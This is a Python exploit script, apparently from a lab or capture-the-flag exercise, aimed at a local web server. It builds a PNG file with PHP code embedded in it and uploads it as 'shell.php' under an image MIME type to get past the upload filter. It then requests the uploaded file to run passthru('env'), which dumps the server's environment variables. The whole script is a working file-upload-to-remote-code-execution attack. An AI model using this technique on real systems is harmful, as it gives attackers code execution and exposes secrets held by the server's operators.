import requests

base_url = "http://127.0.0.1:32818"

# Minimal valid PNG with PHP code
polyglot = (
    b'\x89PNG\r\n\x1a\n'  # PNG signature
    b'\x00\x00\x00\x0dIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x00\x00\x00\x00\x3a\x7e\x9b\x55'  # IHDR
    b'\x00\x00\x00\x0aIDAT\x78\x9c\x62\x00\x00\x00\x02\x00\x01\xe2\x21\xbc\x33'  # IDAT
    b'<?php echo "\\nPHP_EXEC\\n"; passthru("env"); ?>'  # PHP code
    b'\x00\x00\x00\x00IEND\xae\x42\x60\x82'  # IEND
)

print(f"Polyglot: {len(polyglot)} bytes")

# Create session with shorter timeout
session = requests.Session()
session.headers.update({'Connection': 'close'})

# Try .php extension
files = {'userfile': ('shell.php', polyglot, 'image/png')}
data = {'submit': 'Upload File'}

print("\nUploading shell.php...")
try:
    r = session.post(f"{base_url}/index.php", files=files, data=data, timeout=3)
    print(f"Upload: {r.status_code}")
    print(r.text)
except requests.exceptions.Timeout:
    print("Upload timeout (may still succeed)")
except Exception as e:
    print(f"Upload error: {e}")

print("\nAccessing /upload/shell.php...")
try:
    r = session.get(f"{base_url}/upload/shell.php", timeout=3)
    print(f"Access: {r.status_code}")
    print(r.text)
except Exception as e:
    print(f"Access error: {e}")

session.close()

